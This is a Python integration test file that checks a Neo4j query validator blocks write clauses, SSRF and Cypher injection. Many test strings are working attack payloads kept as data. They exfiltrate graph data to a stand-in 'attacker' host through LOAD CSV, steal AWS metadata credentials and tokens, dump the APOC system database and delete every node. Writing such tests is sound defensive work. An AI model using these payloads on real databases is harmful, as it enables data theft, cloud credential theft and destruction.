"""Integration tests for query_validator against a live Neo4j instance.

These tests call validate_query() with no mocking.  They require the Neo4j
service to be running and reachable via the NEO4J_URI environment variable
(the default in docker-compose is bolt://neo4j:7687 with no auth).

Run with:
    docker compose run --rm seizu pipenv run pytest tests/integration
"""
from reporting.services.query_validator import validate_query


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _assert_blocked(query, params=None):
    """validate_query must return has_errors=True for this query."""
    result = validate_query(query, params=params)
    assert result.has_errors, (
        f"Expected query to be blocked but it was allowed.\n"
        f"  query: {query!r}\n"
        f"  errors: {result.errors}\n"
        f"  warnings: {result.warnings}"
    )


def _assert_allowed(query, params=None):
    """validate_query must return has_errors=False for this query."""
    result = validate_query(query, params=params)
    assert not result.has_errors, (
        f"Expected query to be allowed but it was blocked.\n"
        f"  query: {query!r}\n"
        f"  errors: {result.errors}"
    )


# ---------------------------------------------------------------------------
# Valid read queries — must pass
# ---------------------------------------------------------------------------


class TestValidReadQueries:
    def test_simple_match_return(self):
        _assert_allowed("MATCH (n) RETURN n LIMIT 1")

    def test_match_with_where(self):
        _assert_allowed("MATCH (n) WHERE n.name = 'x' RETURN n")

    def test_optional_match(self):
        _assert_allowed("OPTIONAL MATCH (n)-[r]->(m) RETURN n, r, m LIMIT 1")

    def test_unwind(self):
        _assert_allowed("UNWIND [1, 2, 3] AS x RETURN x")

    def test_limit(self):
        _assert_allowed("MATCH (n) RETURN n LIMIT 10")

    def test_multi_match_with(self):
        _assert_allowed(
            "MATCH (n) WITH count(n) AS total "
            "MATCH (n) RETURN count(n) AS current, total"
        )

    def test_parameterized_with_params(self):
        _assert_allowed(
            "MATCH (n) WHERE n.name = $name RETURN n LIMIT 1",
            params={"name": "test"},
        )

    def test_parameterized_without_params_is_warning_not_error(self):
        """Missing params produce a warning, not a blocking error."""
        result = validate_query("MATCH (n) WHERE n.name = $name RETURN n LIMIT 1")
        assert not result.has_errors
        assert any(
            "parameter" in w.lower() or "Parameter" in w for w in result.warnings
        )


# ---------------------------------------------------------------------------
# Write queries — must be blocked
# ---------------------------------------------------------------------------


class TestWriteQueriesBlocked:
    def test_create(self):
        _assert_blocked("CREATE (n:IntegrationTest {x: 1}) RETURN n")

    def test_merge(self):
        _assert_blocked("MERGE (n:IntegrationTest {x: 1}) RETURN n")

    def test_delete(self):
        _assert_blocked("MATCH (n:IntegrationTest) DELETE n")

    def test_detach_delete(self):
        _assert_blocked("MATCH (n:IntegrationTest) DETACH DELETE n")

    def test_set(self):
        _assert_blocked("MATCH (n:IntegrationTest) SET n.x = 2 RETURN n")

    def test_remove_label(self):
        _assert_blocked("MATCH (n:IntegrationTest) REMOVE n:IntegrationTest RETURN n")

    def test_foreach(self):
        _assert_blocked(
            "MATCH (n:IntegrationTest) WITH collect(n) AS nodes "
            "FOREACH (x IN nodes | SET x.pwned = true)"
        )

    def test_merge_on_create_set(self):
        _assert_blocked(
            "MERGE (n:IntegrationTest {x: 1}) " "ON CREATE SET n.role = 'test' RETURN n"
        )


# ---------------------------------------------------------------------------
# LOAD CSV / APOC SSRF — must be blocked
# ---------------------------------------------------------------------------


class TestSSRFQueriesBlocked:
    def test_load_csv_standalone(self):
        _assert_blocked("LOAD CSV FROM 'http://attacker/data' AS row RETURN row")

    def test_load_csv_with_union(self):
        _assert_blocked(
            "MATCH (n) RETURN n UNION "
            "LOAD CSV FROM 'http://attacker/data' AS row RETURN row"
        )

    def test_call_apoc_load(self):
        _assert_blocked(
            "CALL apoc.load.csvParams('http://169.254.169.254/latest/api/token', "
            "{method: 'PUT'}, '', {header: FALSE}) YIELD list RETURN list"
        )

    def test_call_apoc_systemdb(self):
        _assert_blocked("CALL apoc.systemdb.graph() YIELD nodes RETURN nodes")


# ---------------------------------------------------------------------------
# Neo4jection attack vectors (from Varonis research)
# Reference: https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits
# ---------------------------------------------------------------------------


class TestNeo4jectionStringInjection:
    """Payloads that attempt to break out of string comparisons."""

    def test_or_true_with_clause_breakout(self):
        _assert_blocked(
            "' OR 1=1 WITH 0 as _l00 CALL db.labels() yield label "
            "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
        )

    def test_property_filter_breakout(self):
        _assert_blocked(
            "'=' LOAD CSV FROM 'http://attacker/' as l WITH 0 as _l00 RETURN 1 //"
        )


class TestNeo4jectionUnionInjection:
    """UNION-based injection to append attacker-controlled queries."""

    def test_node_property_union_breakout(self):
        _assert_blocked(
            "'}) RETURN 1 UNION MATCH (n) "
            "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
        )

    def test_label_union_breakout(self):
        _assert_blocked(
            "a) RETURN 1 UNION MATCH (n) "
            "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
        )

    def test_relationship_union_breakout(self):
        _assert_blocked(
            "']}]-() RETURN 1 UNION MATCH (n) "
            "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
        )


class TestNeo4jectionDataExfiltration:
    """LOAD CSV-based data exfiltration attacks."""

    def test_label_enumeration_via_load_csv(self):
        _assert_blocked(
            "'}) RETURN 0 as _0 UNION CALL db.labels() yield label "
            "LOAD CSV FROM 'http://attacker/?l='+label as l RETURN 0 as _0"
        )

    def test_property_extraction_via_load_csv(self):
        _assert_blocked(
            "' OR 1=1 WITH 1 as a MATCH (f:Flag) UNWIND keys(f) as p "
            "LOAD CSV FROM 'http://attacker/?'+p+'='+toString(f[p]) as l "
            "RETURN 0 as _0 //"
        )

    def test_json_exfiltration_via_load_csv(self):
        _assert_blocked(
            "' OR 1=1 WITH 0 as _0 MATCH (n) "
            "LOAD CSV FROM 'http://attacker/?json='+apoc.convert.toJson(n) as l "
            "RETURN 0 as _0 //"
        )

    def test_load_csv_standalone(self):
        _assert_blocked("LOAD CSV FROM 'http://attacker/data' AS row RETURN row")


class TestNeo4jectionAPOCExploits:
    """Attacks using APOC procedures for system access."""

    def test_systemdb_graph_exfiltration(self):
        _assert_blocked(
            "' OR 1=1 WITH 1 as a CALL apoc.systemdb.graph() yield nodes "
            "LOAD CSV FROM 'http://attacker/?nodes='+apoc.convert.toJson(nodes) "
            "as l RETURN 1 //"
        )

    def test_procedure_enumeration(self):
        _assert_blocked(
            "' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name "
            "LOAD CSV FROM 'http://attacker/'+name as _l RETURN 1 //"
        )

    def test_apoc_cypher_run_bypass(self):
        _assert_blocked(
            "' OR 1=1 WITH apoc.cypher.runFirstColumnMany("
            '"SHOW FUNCTIONS YIELD name RETURN name",{}) as names '
            "UNWIND names AS name "
            "LOAD CSV FROM 'http://attacker/'+name as _l RETURN 1 //"
        )


class TestNeo4jectionCloudMetadata:
    """Cloud metadata SSRF attacks via LOAD CSV / APOC."""

    def test_aws_imdsv1_credential_theft(self):
        _assert_blocked(
            "LOAD CSV FROM "
            "'http://169.254.169.254/latest/meta-data/iam/security-credentials/' "
            "AS roles UNWIND roles AS role "
            "LOAD CSV FROM "
            "'http://169.254.169.254/latest/meta-data/iam/security-credentials/'"
            "+role as l RETURN l"
        )

    def test_aws_imdsv2_token_via_apoc(self):
        _assert_blocked(
            "CALL apoc.load.csvParams("
            '"http://169.254.169.254/latest/api/token", '
            '{method: "PUT",`X-aws-ec2-metadata-token-ttl-seconds`:21600},'
            '"",{header:FALSE}) yield list '
            "WITH list[0] as token RETURN token"
        )


class TestNeo4jectionUnicodeBypass:
    """Unicode escape sequences used to evade quote filtering."""

    def test_unicode_quote_escape(self):
        _assert_blocked(
            "\u0027}) RETURN 0 as _0 UNION CALL db.labels() yield label "
            'LOAD CSV FROM "http://attacker/"+label RETURN 0 as _o //'
        )


class TestNeo4jectionWriteClauses:
    """Direct write clause injection attempts."""

    def test_create_node_injection(self):
        _assert_blocked(
            "MATCH (n) RETURN n UNION CREATE (evil:Backdoor {cmd: 'whoami'})"
        )

    def test_merge_with_on_create(self):
        _assert_blocked(
            "MERGE (n:IntegrationTest {name: 'attacker'}) "
            "ON CREATE SET n.role = 'superadmin' RETURN n"
        )

    def test_detach_delete_all(self):
        _assert_blocked("MATCH (n) DETACH DELETE n")

    def test_foreach_write(self):
        _assert_blocked(
            "MATCH (n) WITH collect(n) as nodes "
            "FOREACH (x IN nodes | SET x.pwned = true)"
        )

    def test_remove_labels(self):
        _assert_blocked("MATCH (n:IntegrationTest) REMOVE n:IntegrationTest RETURN n")
